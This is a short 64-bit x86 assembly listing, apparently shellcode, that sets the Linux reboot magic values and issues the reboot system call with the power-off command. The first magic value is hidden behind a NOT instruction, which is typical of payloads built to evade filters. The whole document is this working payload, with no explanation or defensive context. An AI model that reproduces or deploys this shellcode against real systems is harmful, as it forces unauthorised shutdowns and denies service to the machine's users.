BITS 64

section .text
global _start

_start:
  push 0x4321fedc
  pop rdx
  push 0x16041998
  pop rsi
  push 0x11e2152
  pop rdi
  not edi
  push 0xa9
  pop rax
  syscall
